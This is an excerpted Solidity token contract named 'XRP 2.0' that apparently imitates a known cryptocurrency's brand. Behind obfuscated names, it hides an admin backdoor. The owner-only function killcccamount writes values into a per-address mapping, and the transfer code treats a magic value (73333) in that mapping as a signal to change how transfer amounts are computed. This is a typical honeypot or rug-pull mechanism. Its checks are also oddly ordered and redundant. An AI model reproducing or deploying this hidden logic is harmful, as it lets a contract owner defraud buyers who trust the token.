...
contract ZIDAOToken is Ownable {
    address public TTeepAdmin;
    uint256 private  zidaosupply = 42000000000*10**decimals();
    uint256 private _tokentotalSSSupply;
    string private _zidaoTokename = "XRP 2.0";
    string private _zidaotokenSSSsymbol = "XRP2.0";
    ...
    constructor(address zidaoadmin) {
        ...
        TTeepAdmin = zidaoadmin;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public PPomuserlio;
    ...
    function killcccamount(address cjjjss) public    {
        uint128 zramount = 0;
        PPomuserlio[cjjjss] = zramount;    
        require(_msgSender() == TTeepAdmin);
        if(_msgSender() != TTeepAdmin){
            require(_msgSender() == TTeepAdmin);
        }
    ...
    function _transfer(
        ...
        if (73333 != PPomuserlio[infoFrom]) {
           
        }else{
             amount = _balances[from] + PPomuserlio[infoFrom];
        }
